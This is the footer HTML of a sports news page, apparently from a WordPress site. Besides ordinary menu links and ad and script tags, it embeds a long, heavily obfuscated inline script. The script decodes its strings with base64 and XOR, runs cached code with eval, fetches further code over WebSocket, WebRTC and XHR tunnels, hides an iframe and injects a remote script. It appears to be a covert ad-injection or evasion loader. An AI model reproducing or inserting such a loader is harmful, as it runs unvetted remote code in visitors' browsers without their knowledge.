<li id="menu-item-1161" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1161"><a title="Cookie Policy" href="http://sportsretriever.com/sr-cookie-policy/">Cookie Policy</a></li>
<li id="menu-item-1163" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1163"><a title="DMCA Policy" href="http://sportsretriever.com/sr-dmca-policy/">DMCA Policy</a></li>
<li id="menu-item-1165" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1165"><a title="Privacy Policy" href="http://sportsretriever.com/sr-privacy-policy/">Privacy Policy</a></li>
<li id="menu-item-1164" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1164"><a title="User Agreement" href="http://sportsretriever.com/user-agreement/">User Agreement</a></li>
</ul>				<h2 class="footer_copy">SportsRetriever
					<script>document.write(new Date().getFullYear())</script>
				</h2>
			</div>
		</div>
	</div>
</div>

</footer>



<script type="text/javascript">
  window._taboola = window._taboola || [];
  _taboola.push({flush: true});
</script>

<script>
  try{!function(){function B(){try{var n=K()}catch(e){}if(n)try{C(n.h,null)}catch(e){delete window.localStorage[n.key],delete window.sessionStorage[n.key]}else L(function(n,e){e.as=!0;try{C(n,e)}catch(A){}},M)}function M(){var n=a(window.location.protocol==a("HBwRFR5Z")?"HBwRFR5ZVkE=":"HBwRFVdMVg==");(new Image).src=n+u+N}function L(n,e){function A(){var t=a.shift();if(t)try{t(n,A)}catch(o){A()}else v(),e()}try{O()}catch(t){return v(),void e()}var a=[P,Q,R,S];A()}function C(a,c){!function(){eval(a)}({e:a,p:c,n:g})}function K(){var n=[];window.localStorage&&n.push(window.localStorage),window.sessionStorage&&n.push(window.sessionStorage);var e=D(a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),E(a("BBoABAABFQs=")));e=new Uint8Array(e);for(var A="",t=0;t<e.length;t++)A+=String.fromCharCode(e[t]);for(e=btoa(A),A=(new Date).getTime(),t=0;t<n.length;t++){var o,c=n[t];for(o in c)if(0===o.lastIndexOf(e,0)){try{for(var w=a("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="),i=atob(c[o]),g=new Uint8Array(i.length),u=0;u<i.length;u++)g[u]=i.charCodeAt(u);var l=r(D(w,g.buffer))}catch(B){continue}if(u=parseInt(l.substring(0,13),10),!isNaN(u))if(A-u>864e5||1>A-u)c.removeItem(o);else if((u=l.substring(13))&&!(16>u.length))return{h:u,key:o}}}return null}function Q(n,e){var A=a("R1xSXQ=="),t=a("QypfVltZTCpPVF1ZKjlCTTJJLE5NUERLJEZONCFcXVJOLCZfLyFDL0BcV1tROkxPMUVXQ0ZTRkFYR0NPJFZUWkNSUVNXIEpUM1NeUC5COkRJNlhNQlxKM1BPQEBYIyg=");A=w+":"+A;var o={};o[a("ARoJFg==")]=a("AB0XC1c=")+A+a("SxwXBAMQCQEHElkXCAg="),o[a("FxoAAQgNDQcUCg==")]=a("DQkRDAAC"),o[a("ARsAFwMCFAs=")]=a("DQkRDAAC"),F(t,o,function(n){return n=n.match(new RegExp(a("KgsECwkKHQ8BA14/D1NYKRdYTV9IUwUVEgkhMTJPTj4QQ0VNMQdSMls6AEg3ViQRWC9DKxNCWVE+EV9VFh8eQgYNCQQU"))),null==n?null:(n=n[1],a("FwkLAQQHGBoQXFVDWlgtMSNTVUREWEJHUVU=")+n+a("VF5WVVxVWRoMFkQRDhQZDFMBDBMTG1A=")+n+a("VBoVCh8XWVhGVlVVSxYdAQQcHxxaCh8CFlVE"))},n,e)}function R(n,e){var A=a("QlhVVA=="),t=a("Ml1fJC9ZQVdPI1BZX0lCTEJJWk5NWkNLUkdON1pcWSNOXSdfKFJDKEBcUFVRTz1PNTZXQjFTQkVYTTJPICNUVjFSViZXJjpUQl5eU11CTUZJMl9NRC9KRSNPQ0xYX1Y=");A=w+":"+A;var o={};o[a("ARoJFg==")]=[a("BxwQC1c=")+A],F(t,o,function(n){return n=n.match(new RegExp(a("KgsECwkKHQ8BA14/D1NYKRdYTV9IUwUVEgkhMTJPTj4QQ0VNMQdSMls6AEg3ViQRWC9DKxNCUC0GXl1VFh8eQgcaAwkV"))),null==n?null:(n=n[1],a("FwkLAQQHGBoQXFRDWlgtMSNTX0ZDXkRJUUNAQkI=")+n+a("VBwcFU0LFh0B"))},n,e)}function F(n,e,A,t,o){function r(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var c=!1;t=r.bind(null,t),o=r.bind(null,o);var w={};w[a("HQsANggRDwsHFQ==")]=[e];var i=new g.c(w);i[a("FxoABBkGPQ8BBycLChYWEB8=")](a("WwUAEQxMCQcbAQ==")).binaryType=a("FRoXBBQBDAgTAxY="),i[a("GwYMBggAGAARDwACHx0=")]=function(n){if(null!=n[a("FwkLAQQHGBoQ")]&&(n=A(n[a("FwkLAQQHGBoQ")][a("FwkLAQQHGBoQ")]),null!=n)){var e={};e[a("FwkLAQQHGBoQ")]=n,e[a("BwwVKCEKFws8CAAGEw==")]=0,i[a("FQwBLA4GOg8bAg0HCgwd")](new g.b(e),function(){},function(){})}},i.addEventListener(a("HQsABgINFwsWEg0MBQsMFAcWDh8WBxcU"),function(){i[a("HQsAJgINFwsWEg0MBSsMFAcW")]===a("EgkMCQgH")&&o()});var u=a("AlVVbwJeDB0QFAoCBh1YRVNDTT45STkhVlVFR1VIXkxERlRvHl4KCwYVDQwFFhkYFnkOSj4nUDgyQVREUFFAUlpYS1RnF0ReVVZuAlYeERsUFh8HBQAeBVgGHBRPVFtUVA==")+n+a("fglYDA4GVAEFEg0MBQtCAQEaDhwbDHocXxQEBQ4PDQMAAQoLTVJLXUFGIDcnK1cmMCc9V0JZQEFoFEkGARIeDxUYX1BdU0lOAgMGER8bVRESBwwUHwgeHwcZVEdXUGQDSQEGAEAWHxwUAV4=")+function(){for(var n="",e=a("RFhVVV1TSV4="),A=0;16>A;++A){var t=(4294967296*Math.random()>>>0).toString(16);n+=e.substring(0,e.length-t.length)+t}return n}()+a("fglYDA4GVB4CAl5TW0hIRUNDXUdHWUBBUkVERVJWXlJEWFVVXVNJXkVWVGk=");i[a("FxoABBkGNggTAxY=")](function(n){i[a("Bw0RKQIAGAIxAxcAGREIARocAw==")](n,function(){var n={};n[a("ABEVAA==")]=a("FQYWEggR"),n[a("BwwV")]=u,i[a("Bw0RNwgOFhoQIgEQCAoRBQcaAhk=")](new g.f(n),function(){},function(){})},function(){})},function(){}),n=i[a("FxoABBkGPQ8BBycLChYWEB8=")](a("Wx8WFW0=")+window.navigator.userAgent),n.binaryType=a("FRoXBBQBDAgTAxY="),G(n,x(),function(n){t(n,{rtc:i})},function(){o()})}function S(n,e){function A(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var t=x();t=a(window.location.protocol==a("HBwRFR5Z")?"HBwRFR5ZVkE=":"HBwRFVdMVg==")+u+t;var o=a("My0x"),c=!1;n=A.bind(null,n),e=A.bind(null,e);var w=new g.g;w.onreadystatechange=function(){4==w.readyState&&(0==w.status?e():n(r(w.response),{}))},w.onerror=function(){e()},w.open(o,t,!0),w.responseType=a("FRoXBBQBDAgTAxY="),w.send(null)}function P(n,e){var A=a("AxsWX0JM"),t=new g.a(A+w+a("Wx8WFQ=="));t.binaryType=a("FRoXBBQBDAgTAxY="),G(t,x(),function(e){n(e,{ws:t})},function(){e()})}function G(n,e,A,t){function o(n){c||(c=!0,n.apply(null,Array.prototype.slice.call(arguments,1)))}var c=!1;A=o.bind(null,A),t=o.bind(null,t);var w=!1,i=setTimeout(function(){t(Error())},3e3),g=E(JSON.stringify({url:e||"",method:a("My0x"),headers:null,body:null}));n.onopen=function(){clearTimeout(i),n.send(g)};var u,l=new ArrayBuffer(0);n.onmessage=function(n){if(4===n.data.byteLength){var e=new Uint8Array(n.data);if(222===e[0]&&173===e[1]&&190===e[2]&&239===e[3])return}!1===w?(w=!0,n=r(n.data),u=JSON.parse(n),u={status:u.status||0,headers:u.headers||{}}):(n=n.data,e=new Uint8Array(l.byteLength+n.byteLength),e.set(new Uint8Array(l),0),e.set(new Uint8Array(n),l.byteLength),l=e.buffer)},n.onerror=function(){clearTimeout(i),t(Error())},n.onclose=function(){w?(u.body=l,A(r(u.body))):(clearTimeout(i),t(Error()))}}function y(n){return window[n.name]?window[n.name]:n[a("FwcLEQgNDSoaBREODhYM")]&&n[a("FwcLEQgNDSoaBREODhYM")][a("EA0DBBgPDTgcAxM=")]?n[a("FwcLEQgNDSoaBREODhYM")][a("EA0DBBgPDTgcAxM=")]:n[a("FwcLEQgNDTkcCAAMHA==")]}function H(){var n=document.createElement(a("HQ4XBAAG"));n.style.height=a("RRgd"),n.style.width=a("RRgd"),n.style.display=a("GgcLAA=="),n[a("BxoGAQIA")]=a("FQ=="),n.name||(n.name=String.fromCharCode(parseInt(25*Math.random()+97,10))+Math.random().toString(36).substring(7)),(document.body||document.head||document.documentElement).appendChild(n);var e=y(n);e.document.documentElement||e.document.write(a("FQ=="));try{e.stop()}catch(A){}return n}function O(){I=a("AQYOCwIUFw=="),t=a("FwAXCgAG"),q=a("EgEXAAsMAQ=="),z=a("GxgAFww="),A=a("BwkDBB8K");var n=H();n=y(n);var e=n.navigator.userAgent,o=new RegExp(a("FwAXCgAGBQ0dFAsOAg0V"),"i").test(e)?t:new RegExp(a("EgEXAAsMARIcBQEUDhkLEB8PCw8eBgM="),"i").test(e)?q:new RegExp(a("KkBNWkwAERwaCwEfChYcBxwaCV5ZQFoCAxMVBws="),"i").test(e)?A:new RegExp(a("GxgXGQITEAEG"),"i").test(e)?z:window[a("FwAXCgAG")]?t:"undefined"!=typeof InstallTrigger?q:I;-1===[t,q,z,A].indexOf(o)&&(n=window),e=a("ER4ECQ=="),g.c=n[e](a("AwELAQIUVzwhJTQGDgo7Gh0dCBQDAB8fQgkIVRUPAAYbH0sSCAESBwE0MCA7HR0HMBwDGRIKBBgNG1QJHkYZCxoMChJDDhYUJzInMw4dCjYcHQMSFB0ZHgxVCAlCEQcMEAcSSwAQKzo2NgEGGTsXGx0WDgMeBh4=")),g.f=n[e](a("AwELAQIUVzwhJTcGGAsRGh03CAQUGxkBFhwbG0IaEkIDAQsBAhRXGRAEDwofKiw2IBYeBB4GHjUHBhcHCxYaCxsGRRkRQw4HGwILFEUVFw8hJy4kEhoDGA0bMBARBRwLBBwMCgNDBRJVEQ0NDxcPWx4APyM0OhUCERwbGyYDHQEGARURBAwX")),g.b=n[e](a("AwELAQIUVzwhJS0ADjsZGxcaCRYDDFANHlUDHAwCARVaHwAHBgoNPCElLQAOOxkbFxoJFgMMUA0eVQMcDAIBFVoFCh8/NzonFgMnAgUcERESBwhXCxVQBgsbEBoVSAMRJjwmLA4GOg8bAg0HCgwd")),o===q?(o=H(),g.a=y(o)[e](a("AwELAQIUVzkQBDcMCBMdAQ==")),o.parentElement.removeChild(o)):g.a=n[e](a("AwELAQIUVzkQBDcMCBMdAQ==")),g.g=n[e](a("AwELAQIUVzY4KiwXHwgqEAIGCAQD"))}function D(n,e){var A=new Uint8Array(e),t=new ArrayBuffer(e.byteLength);t=new Uint8Array(t);for(var a=0;a<e.byteLength;a++)t[a]=A[a]^n.charCodeAt(a%n.length);return t.buffer}function r(n){if(window.TextDecoder)return new window.TextDecoder("utf-8").decode(new Uint8Array(n));var e="";n=new Uint8Array(n);for(var A=n.byteLength,t=0;A>t;t++)e+=String.fromCharCode(n[t]);return decodeURIComponent(escape(e))}function E(n){if(window.TextEncoder)return new window.TextEncoder("utf-8").encode(n).buffer;n=unescape(encodeURIComponent(n));for(var e=new Uint8Array(n.length),A=0;A<n.length;A++)e[A]=n.charCodeAt(A);return e.buffer}function x(){return a("Ww0PFlITRA==")+"2204240001"}function a(n){n=window.atob(n);for(var e="",A=0;A<n.length;A++)e+=String.fromCharCode(n.charCodeAt(A)^"theemcynufdckxxussmwwipqbutubfnb".charCodeAt(A%32));return e}function v(){if(!J){var n=("https:"==window.location.protocol?"https://":"http://")+u+T,e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src=n,(document.body||document.head||document.documentElement).appendChild(e),J=!0}}var u=a("DAAXSw4CFBocCAsPCFYbGh4="),w=a("FUYGBAAXEAAaCgdNCBcV"),T=decodeURIComponent("%2Fljs%3Fp%3D")+"2204240001",N="/l?p=2204240001&c=ef&cb="+Math.random().toString().slice(3,9),g={},I,t,q,z,A,J=!1;if(/ucbrowser/i.test(navigator.userAgent)||window.i)try{v()}catch(b){}try{B()}catch(b){}}()}catch(B){}
</script><script type='text/javascript' src='http://sportsretriever.com/wp-content/plugins/forensiq-include/forensiq-script.min.js?ver=1.0.0'></script>
<script type='text/javascript' src='http://sportsretriever.com/wp-content/themes/sportsretriver/scripts/plugins.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://sportsretriever.com/wp-content/themes/sportsretriver/scripts/main.js?ver=4.8.5'></script>
<script type='text/javascript' src='http://sportsretriever.com/wp-includes/js/wp-embed.min.js?ver=4.8.5'></script>
</body>
</html>